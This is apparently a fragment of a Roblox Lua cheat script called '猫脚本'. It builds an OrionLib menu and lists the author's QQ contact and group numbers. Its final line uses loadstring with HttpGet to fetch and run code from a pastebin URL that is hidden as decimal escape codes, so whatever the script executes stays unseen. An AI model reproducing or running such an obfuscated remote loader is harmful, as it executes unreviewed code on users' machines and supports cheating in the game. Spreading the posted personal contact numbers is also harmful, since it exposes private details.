...
local Window = OrionLib:MakeWindow({Name = "猫脚本", HidePremium = false, SaveConfig = true,IntroText = "猫脚本", ConfigFolder = "猫脚本"})

game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "猫脚本"; Text ="猫脚本"; Duration = 4; })
...
about:AddParagraph("作者QQ2049856701")
about:AddParagraph("qq群聊935143896")
about:AddParagraph("作者猫王")
...
loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\86\107\116\75\118\88\103\55"))()
